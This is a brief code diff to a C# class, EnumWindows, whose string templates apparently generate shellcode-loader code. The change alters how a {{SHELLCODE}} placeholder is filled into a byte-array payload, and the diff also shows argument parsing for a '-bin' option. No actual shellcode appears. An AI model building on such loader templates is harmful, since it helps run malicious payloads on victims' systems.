@@ -3,8 +3,10 @@
     class EnumWindows
     {
         public static string STATIC = @"
-            List<byte> payloadList = new List<byte> { {{SHELLCODE}} };
-            byte[] payload = payloadList.ToArray();";
+            System.Collections.Generic.List<byte> payloadList = new System.Collections.Generic.List<byte>();
+            {{SHELLCODE}}
+            byte[] payload = payloadList.ToArray();
+            ";
 
         public static string DYNAMIC = @"
             if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase)){
